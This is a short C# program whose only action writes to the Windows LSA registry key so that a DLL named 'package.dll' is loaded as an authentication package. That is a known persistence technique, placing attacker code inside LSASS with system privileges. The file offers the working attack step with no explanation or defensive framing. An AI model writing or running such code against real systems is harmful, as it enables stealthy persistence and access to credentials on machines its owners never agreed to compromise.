using System;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace registry
{
    class Program
    {
        static void Main(string[] args)
        {
            
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\\CurrentControlSet\\Control\\Lsa", true);
                key.SetValue("Authentication Packages", new string[] { "msv1_0", "package.dll" }, RegistryValueKind.MultiString);
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: {0}.\n", ex.Message);
                Environment.Exit(1);
            }
        }
    }
}